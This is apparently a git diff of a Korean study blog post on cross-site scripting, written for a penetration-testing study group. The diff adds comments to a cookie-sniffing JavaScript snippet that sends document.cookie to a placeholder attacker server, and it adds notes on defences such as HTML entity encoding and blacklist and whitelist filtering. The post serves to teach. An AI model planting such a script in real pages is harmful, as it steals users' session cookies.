@@ -8,7 +8,7 @@ title: "[WEB HACKING] XSS란?"
 excerpt: "모의해킹 취업반 스터디 7기 9주차"
 
 date: 2024-12-11
-last_modified_at: 2024-12-19
+last_modified_at: 2024-12-26
 
 tags: [TIL, WEB, SECURITY]
 ---
@@ -34,8 +34,8 @@ XSS 공격 방식으로는 <mark>Cookie Sniffing</mark>, <mark>스크립트 암�
 ### 2.1. Cookie Sniffing
 ```js
 let cookieData = document.cookie;
-let img = new Image();
-img.src = "http://[공격자서버]/?cookie=" + cookieData;
+let img = new Image(); // img 태그 생성
+img.src = "http://[공격자서버]/?cookie=" + cookieData; // src의 공격자 서버에 접속하면서 cookie data를 남긴다.
 ```
 JS 코드가 img 태그를 만든다  
 img 태그는 만들어지기 위해 src의 URL을 접속한다  
@@ -163,6 +163,16 @@ burp, param check, response에 같은 값 있나?
 ## 6. 대응방안
 1. HTML 특수문자를 <mark>HTML Entity</mark> 표현 방법으로 치환하기
 ![Some HTML Entities](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-12-19-2.png?raw=true)
+-> 적용하지 못하는 곳: HTML Editor 등
+1. 필터링
+    * 블랙 리스트 기반 필터링: 특정 단어를 못 들어오게 하는 것  
+    -> 우회가 될 가능성이 존재한다.
+    * 화이트 리스트 기반 필터링: 특정 단어만 들어오게 하는 것
+
+* HTML Editor 같은 곳에서
+1. 파라미터에서 HTML 특수문자들을 전부 HTML Entity로 치환
+1. 허용해줄 tag를 식별하고 그 tag를 다시 살린다. (화이트 리스트 기반)
+1. 살려준 tag 내에 악의적인 Event Handler 필터링. (블랙 리스트 기반)
 
 # 참고
 * [Cross Site Scripting](https://owasp.org/www-community/attacks/xss/)
